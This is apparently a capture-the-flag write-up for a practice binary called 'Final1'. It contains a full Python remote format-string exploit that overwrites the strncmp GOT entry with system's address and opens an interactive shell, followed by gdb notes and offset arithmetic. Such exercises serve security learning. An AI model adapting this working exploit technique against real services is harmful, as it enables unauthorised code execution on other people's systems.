### Final1 Remote Format String Exploit

```
import socket
import struct
import time
import telnetlib

HOST="127.0.0.1"
PORT=2994

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
ip, port = s.getsockname()
hostname="{ip}:{port}".format(ip=str(ip), port=str(port))

padding = (24-len(hostname)) * "A" # ensures consistency in terms of how our variables are aligned and stored in the stack

_SYSTEM = struct.pack("I", 0xb7ecffb0)

STRNCMP = struct.pack("I", 0x804a1a8)

STRNCMP_2 = struct.pack("I", 0x804a1a8+2)

USERNAME_PAYLOAD = "username " + padding + STRNCMP + STRNCMP_2 + "\n"

LOGIN_PAYLOAD = "login " + "%65391x%17$n" + "%47164x%18$n" + "\n"

s.send(USERNAME_PAYLOAD)
s.send(LOGIN_PAYLOAD)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

### Interesting observations tinkering around with gdb

- After attaching program to gdb, if you do not continue the program, running your exploit will hang at accept() till you run `(gdb) c` to continue execution which makes sense cause attaching programs to debuggers such as gdb will pause program execution.

- `(gdb) set follow-fork-mode child` to follow every child thread forked by main thread. To understand why the program exactly does this, see 0x19 where LiveOverflow reverses Net0 binary using strace.

### Offset Calculation things

1.  ```
    STRNCMP = struct.pack("I", 0x804a1a8)
    STRNCMP_2 = struct.pack("I", 0x804a1a8+2)
    USERNAME_PAYLOAD = "username " + padding + STRNCMP + STRNCMP_2 + "\n"
    LOGIN_PAYLOAD = "login " + "%17$n" + "%18$n" + "\n"
    ```
    
    ```
    (gdb) x 0x804a1a8
    0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>:	0x00410041
    (gdb) print 0xffb0 - 0x41
    $2 = 65391
    ```

2.  ```
    STRNCMP = struct.pack("I", 0x804a1a8)
    STRNCMP_2 = struct.pack("I", 0x804a1a8+2)
    USERNAME_PAYLOAD = "username " + padding + STRNCMP + STRNCMP_2 + "\n"
    LOGIN_PAYLOAD = "login " + "%65391x%17$n" + "%18$n" + "\n"
    ```
    
    ```
    (gdb) x 0x804a1a8
    0x804a1a8 <_GLOBAL_OFFSET_TABLE_+188>:	0xffb0ffb0
    (gdb) print 0xb7ec - 0xffb0
    $1 = -18372
    (gdb) print 0x1b7ec - 0xffb0
    $2 = 47164
    ```